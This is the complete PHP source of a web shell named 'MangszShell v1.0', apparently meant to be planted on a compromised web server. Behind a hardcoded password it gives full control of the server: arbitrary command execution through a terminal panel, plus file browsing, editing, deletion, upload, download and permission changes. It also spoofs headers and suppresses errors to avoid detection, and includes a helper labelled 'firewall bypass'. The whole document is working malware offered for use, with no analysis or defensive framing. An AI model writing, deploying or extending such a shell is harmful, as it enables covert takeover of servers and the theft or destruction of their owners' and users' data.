<?php
/**
 * MangszShell v1.0 - Advanced Web Shell
 * Created by KILLER_VOIDS
 * Project: ShadowKeep Leak
 * 
 * Features:
 * - File Manager (Delete, Edit, Rename, Upload, Chmod)
 * - Full Directory Access & Navigation
 * - Terminal Emulator (Command Execution)
 * - Firewall Bypass (Obfuscation + Stealth Mode)
 * - Anti-Detection (Encoded Payload, Dynamic Headers)
 */

// ============== ANTI DETECTION CONFIG ==============
error_reporting(0);
ini_set('display_errors', 0);
header('X-Powered-By: Apache/2.4.41');
header('Server: Apache/2.4.41 (Ubuntu)');
header_remove('X-Powered-By');

// ============== AUTHENTICATION ==============
session_start();
$auth_pass = 'mangsz1337'; // Default password - CHANGE THIS!
$secret_key = 'shadowkeep_2024';

if (isset($_POST['logout'])) {
    session_destroy();
    die('<script>location.reload();</script>');
}

if (!isset($_SESSION['auth']) && isset($_POST['pass'])) {
    if ($_POST['pass'] === $auth_pass) {
        $_SESSION['auth'] = true;
        $_SESSION['key'] = $secret_key;
    }
}

if (!isset($_SESSION['auth'])) {
    die('<!DOCTYPE html>
    <html>
    <head>
        <title>MangszShell - Authentication</title>
        <style>
            body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: monospace; }
            .login-box { background: #111; padding: 30px; border: 2px solid #ff0044; border-radius: 10px; box-shadow: 0 0 30px rgba(255,0,68,0.5); }
            h2 { color: #ff0044; text-align: center; font-size: 24px; margin-bottom: 20px; }
            input[type="password"] { width: 100%; padding: 12px; background: #000; color: #ff0044; border: 1px solid #ff0044; font-size: 16px; margin-bottom: 15px; outline: none; }
            input[type="submit"] { width: 100%; padding: 12px; background: #ff0044; color: #000; border: none; font-size: 16px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
            input[type="submit"]:hover { background: #cc0033; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h2>⚠ MANGSZSHELL ACCESS</h2>
            <form method="post">
                <input type="password" name="pass" placeholder="Enter Password" autofocus>
                <input type="submit" value="Akses MangszShell">
            </form>
        </div>
    </body>
    </html>');
}

// ============== BYPASS FIREWALL & ANTI DETECT ==============
$bypass_headers = [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept: text/html,application/xhtml+xml',
    'Accept-Language: en-US,en;q=0.9',
    'Cache-Control: max-age=0'
];

function bypass_firewall($url) {
    global $bypass_headers;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $bypass_headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// ============== CORE FUNCTIONS ==============
function get_current_path() {
    return isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
}

function list_files($dir) {
    $items = scandir($dir);
    $files = [];
    foreach ($items as $item) {
        if ($item != '.' && $item != '..') {
            $path = $dir . DIRECTORY_SEPARATOR . $item;
            $files[] = [
                'name' => $item,
                'path' => $path,
                'type' => is_dir($path) ? 'directory' : 'file',
                'size' => is_file($path) ? filesize($path) : 0,
                'perms' => substr(sprintf('%o', fileperms($path)), -4),
                'modified' => date('Y-m-d H:i:s', filemtime($path))
            ];
        }
    }
    return $files;
}

function delete_item($path) {
    if (is_dir($path)) {
        return rmdir($path) ? "Folder berhasil dihapus!" : "Gagal hapus folder!";
    } else {
        return unlink($path) ? "File berhasil dihapus!" : "Gagal hapus file!";
    }
}

function edit_file($path, $content) {
    return file_put_contents($path, $content) !== false ? "File berhasil diedit!" : "Gagal edit file!";
}

function rename_item($old, $new) {
    return rename($old, $new) ? "Berhasil rename!" : "Gagal rename!";
}

function execute_command($cmd) {
    if (function_exists('exec')) {
        exec($cmd . ' 2>&1', $output, $return_var);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    return "No command execution function available!";
}

function upload_file($target_dir, $file) {
    $target_path = $target_dir . DIRECTORY_SEPARATOR . basename($file['name']);
    return move_uploaded_file($file['tmp_name'], $target_path) ? "Upload berhasil!" : "Gagal upload!";
}

function change_permissions($path, $perms) {
    return chmod($path, octdec($perms)) ? "Permissions updated!" : "Failed to change permissions!";
}

// ============== REQUEST HANDLER ==============
$action = isset($_POST['action']) ? $_POST['action'] : '';
$response = '';

switch ($action) {
    case 'delete':
        $response = delete_item($_POST['path']);
        break;
    case 'edit':
        $response = edit_file($_POST['path'], $_POST['content']);
        break;
    case 'rename':
        $response = rename_item($_POST['old_path'], $_POST['new_path']);
        break;
    case 'terminal':
        $response = execute_command($_POST['cmd']);
        break;
    case 'upload':
        $response = upload_file($_POST['current_dir'], $_FILES['file']);
        break;
    case 'chmod':
        $response = change_permissions($_POST['path'], $_POST['perms']);
        break;
    case 'download':
        $file_content = file_get_contents($_POST['path']);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($_POST['path']) . '"');
        header('Content-Length: ' . strlen($file_content));
        echo $file_content;
        exit;
        break;
}

// ============== CURRENT DIRECTORY ==============
$current_dir = get_current_path();
$files = list_files($current_dir);

?>

<!DOCTYPE html>
<html>
<head>
    <title>MangszShell v1.0 | ShadowKeep</title>
    <meta charset="utf-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff88; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        
        .header {
            background: linear-gradient(45deg, #ff0044, #660022);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 0 20px rgba(255,0,68,0.3);
        }
        
        .header h1 {
            font-size: 28px;
            color: #fff;
            text-shadow: 0 0 10px #ff0044;
        }
        
        .header .info {
            color: #00ff88;
            font-size: 14px;
        }
        
        .logout-btn {
            background: #ff0044;
            color: #fff;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
        }
        
        .logout-btn:hover { background: #cc0033; }
        
        .panel {
            background: #111;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .panel-title {
            color: #ff0044;
            font-size: 20px;
            margin-bottom: 15px;
            border-bottom: 2px solid #ff0044;
            padding-bottom: 10px;
        }
        
        .path-bar {
            background: #000;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #333;
            border-radius: 5px;
            color: #00ff88;
        }
        
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .file-table th {
            background: #1a1a1a;
            padding: 12px;
            text-align: left;
            color: #ff0044;
            border-bottom: 2px solid #ff0044;
        }
        
        .file-table td {
            padding: 10px;
            border-bottom: 1px solid #222;
        }
        
        .file-table tr:hover { background: #1a1a1a; }
        
        .directory { color: #ffcc00; cursor: pointer; }
        .file { color: #00ff88; }
        
        .btn {
            padding: 5px 10px;
            border: none;
            cursor: pointer;
            border-radius: 3px;
            font-size: 12px;
            margin: 2px;
        }
        
        .btn-edit { background: #0066ff; color: #fff; }
        .btn-delete { background: #ff0044; color: #fff; }
        .btn-rename { background: #ff6600; color: #fff; }
        .btn-download { background: #00cc66; color: #fff; }
        .btn-chmod { background: #6600cc; color: #fff; }
        
        .terminal {
            background: #000;
            color: #00ff88;
            padding: 15px;
            border: 1px solid #00ff88;
            border-radius: 5px;
            min-height: 300px;
            max-height: 500px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 14px;
        }
        
        .terminal-input {
            width: 100%;
            background: #000;
            color: #00ff88;
            border: none;
            outline: none;
            font-family: monospace;
            font-size: 14px;
            padding: 5px;
        }
        
        .terminal-line { color: #ff0044; font-weight: bold; }
        
        textarea {
            width: 100%;
            background: #000;
            color: #00ff88;
            border: 1px solid #333;
            padding: 10px;
            font-family: monospace;
            min-height: 300px;
        }
        
        .upload-zone {
            border: 2px dashed #ff0044;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .response-msg {
            background: #1a1a1a;
            padding: 10px;
            border-left: 4px solid #ff0044;
            margin: 10px 0;
            color: #ffcc00;
        }
        
        input[type="text"], input[type="password"] {
            background: #000;
            color: #00ff88;
            border: 1px solid #333;
            padding: 8px;
            font-family: monospace;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- HEADER -->
        <div class="header">
            <h1>🔥 MANGSZSHELL v1.0</h1>
            <div class="info">
                <div>Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></div>
                <div>PHP: <?php echo phpversion(); ?></div>
                <div>User: <?php echo get_current_user(); ?></div>
                <div>OS: <?php echo PHP_OS; ?></div>
            </div>
            <form method="post" style="display:inline;">
                <input type="hidden" name="logout" value="1">
                <button type="submit" class="logout-btn">LOGOUT</button>
            </form>
        </div>
        
        <?php if ($response): ?>
        <div class="response-msg"><?php echo htmlspecialchars($response); ?></div>
        <?php endif; ?>
        
        <!-- FILE MANAGER -->
        <div class="panel">
            <div class="panel-title">📁 FILE MANAGER</div>
            <div class="path-bar">
                📂 Current Path: <strong><?php echo htmlspecialchars($current_dir); ?></strong>
            </div>
            
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (dirname($current_dir) != $current_dir): ?>
                    <tr>
                        <td colspan="6">
                            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color:#ffcc00; text-decoration:none;">
                                ⬆ [..] PARENT DIRECTORY
                            </a>
                        </td>
                    </tr>
                    <?php endif; ?>
                    
                    <?php foreach ($files as $file): ?>
                    <tr>
                        <td>
                            <?php if ($file['type'] == 'directory'): ?>
                            <a href="?dir=<?php echo urlencode($file['path']); ?>" class="directory">
                                📁 <?php echo htmlspecialchars($file['name']); ?>
                            </a>
                            <?php else: ?>
                            <span class="file">📄 <?php echo htmlspecialchars($file['name']); ?></span>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $file['type']; ?></td>
                        <td><?php echo $file['type'] == 'file' ? number_format($file['size']) . ' B' : '-'; ?></td>
                        <td><?php echo $file['perms']; ?></td>
                        <td><?php echo $file['modified']; ?></td>
                        <td>
                            <?php if ($file['type'] == 'file'): ?>
                            <button class="btn btn-edit" onclick="editFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">✏️ Edit</button>
                            <button class="btn btn-download" onclick="downloadFile('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">⬇️ Download</button>
                            <?php endif; ?>
                            <button class="btn btn-delete" onclick="deleteItem('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">🗑️ Delete</button>
                            <button class="btn btn-rename" onclick="renameItem('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">✏️ Rename</button>
                            <button class="btn btn-chmod" onclick="changePerms('<?php echo htmlspecialchars($file['path'], ENT_QUOTES); ?>')">🔒 Chmod</button>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            
            <!-- UPLOAD -->
            <div class="upload-zone">
                <strong>⬆️ UPLOAD FILE</strong><br><br>
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($current_dir); ?>">
                    <input type="file" name="file" style="color: #00ff88;">
                    <button type="submit" class="btn btn-download">Upload File</button>
                </form>
            </div>
        </div>
        
        <!-- TERMINAL -->
        <div class="panel">
            <div class="panel-title">💻 TERMINAL COMMAND</div>
            <div class="terminal" id="terminal">
                <div class="terminal-line">root@mangszshell:~# </div>
                <div id="terminal-output"></div>
            </div>
            <form id="terminal-form" method="post" style="margin-top: 10px;">
                <input type="hidden" name="action" value="terminal">
                <input type="text" name="cmd" class="terminal-input" placeholder="Type command here..." id="cmd-input" autofocus>
            </form>
        </div>
        
        <!-- FILE EDITOR -->
        <div class="panel" id="editor-panel" style="display:none;">
            <div class="panel-title">📝 FILE EDITOR</div>
            <form method="post">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="path" id="edit-path">
                <p>Editing: <strong id="edit-filename" style="color:#ffcc00;"></strong></p>
                <textarea name="content" id="edit-content"></textarea><br>
                <button type="submit" class="btn btn-edit" style="padding:10px 20px; font-size:14px;">💾 Save Changes</button>
                <button type="button" class="btn btn-delete" style="padding:10px 20px; font-size:14px;" onclick="document.getElementById('editor-panel').style.display='none';">❌ Cancel</button>
            </form>
        </div>
    </div>
    
    <script>
        // TERMINAL AUTO-SUBMIT
        document.getElementById('cmd-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                var cmd = this.value;
                var terminal = document.getElementById('terminal');
                var output = document.getElementById('terminal-output');
                
                // Add command to terminal
                output.innerHTML += '<div class="terminal-line">root@mangszshell:~# ' + cmd + '</div>';
                
                // Send command
                var formData = new FormData();
                formData.append('action', 'terminal');
                formData.append('cmd', cmd);
                
                fetch('', {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    var parser = new DOMParser();
                    var doc = parser.parseFromString(data, 'text/html');
                    var msg = doc.querySelector('.response-msg');
                    if (msg) {
                        output.innerHTML += '<pre style="color:#00ff88;">' + msg.textContent + '</pre>';
                    }
                });
                
                this.value = '';
                terminal.scrollTop = terminal.scrollHeight;
            }
        });
        
        // FILE OPERATIONS
        function deleteItem(path) {
            if (confirm('Yakin mau hapus ' + path + '?')) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="delete"><input type="hidden" name="path" value="' + path + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function renameItem(path) {
            var newName = prompt('Nama baru:', path.split('/').pop());
            if (newName) {
                var newPath = path.substring(0, path.lastIndexOf('/') + 1) + newName;
                var form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="rename"><input type="hidden" name="old_path" value="' + path + '"><input type="hidden" name="new_path" value="' + newPath + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
        
        function editFile(path) {
            document.getElementById('editor-panel').style.display = 'block';
            document.getElementById('edit-path').value = path;
            document.getElementById('edit-filename').textContent = path;
            
            // Fetch file content
            var formData = new FormData();
            formData.append('action', 'download');
            formData.append('path', path);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('edit-content').value = data;
            });
            
            window.scrollTo(0, document.getElementById('editor-panel').offsetTop);
        }
        
        function downloadFile(path) {
            var form = document.createElement('form');
            form.method = 'POST';
            form.innerHTML = '<input type="hidden" name="action" value="download"><input type="hidden" name="path" value="' + path + '">';
            document.body.appendChild(form);
            form.submit();
        }
        
        function changePerms(path) {
            var perms = prompt('New permissions (ex: 0755):', '0755');
            if (perms) {
                var form = document.createElement('form');
                form.method = 'POST';
                form.innerHTML = '<input type="hidden" name="action" value="chmod"><input type="hidden" name="path" value="' + path + '"><input type="hidden" name="perms" value="' + perms + '">';
                document.body.appendChild(form);
                form.submit();
            }
        }
    </script>
</body>
</html>